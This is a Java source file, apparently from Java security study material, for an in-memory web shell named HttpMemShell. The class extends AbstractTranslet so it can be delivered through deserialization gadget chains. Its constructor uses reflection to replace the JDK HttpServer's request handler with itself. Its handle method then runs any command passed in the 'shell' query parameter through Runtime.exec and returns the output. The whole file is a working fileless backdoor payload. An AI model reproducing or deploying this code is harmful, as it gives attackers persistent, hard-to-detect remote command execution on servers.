package com.javasec.memshell;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

public class HttpMemShell extends AbstractTranslet implements HttpHandler {
    @Override
    public void handle(HttpExchange httpExchange) throws IOException {
        String query = httpExchange.getRequestURI().getQuery();
        String[] split = query.split("=");
        String response = "SUCCESS"+"\n";
        if (split[0].equals("shell")) {
            String cmd = split[1];
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            byte[] bytes = new byte[1024];
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int flag=-1;
            while((flag=inputStream.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,flag);
            }
            response += byteArrayOutputStream.toString();
            byteArrayOutputStream.close();
        }
        httpExchange.sendResponseHeaders(200,response.length());
        OutputStream outputStream = httpExchange.getResponseBody();
        outputStream.write(response.getBytes());
        outputStream.close();
    }
    public HttpMemShell(){ //public和default的区别 public对所有类可见;default对同一个包内可见;templatlmpl默认实例化使用public memshell()
        try{
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsFeld = threadGroup.getClass().getDeclaredField("threads");
            threadsFeld.setAccessible(true);
            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);
            Thread thread = threads[1];

            Field targetField = thread.getClass().getDeclaredField("target");
            targetField.setAccessible(true);
            Object object = targetField.get(thread);

            Field this$0Field = object.getClass().getDeclaredField("this$0");
            this$0Field.setAccessible(true);
            object = this$0Field.get(object);

            Field contextsField = object.getClass().getDeclaredField("contexts");
            contextsField.setAccessible(true);
            object = contextsField.get(object);

            Field listField = object.getClass().getDeclaredField("list");
            listField.setAccessible(true);
            java.util.LinkedList linkedList = (java.util.LinkedList)listField.get(object);
            object = linkedList.get(0);

            Field handlerField = object.getClass().getDeclaredField("handler");
            handlerField.setAccessible(true);
            handlerField.set(object,this);
        }catch(Exception exception){
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
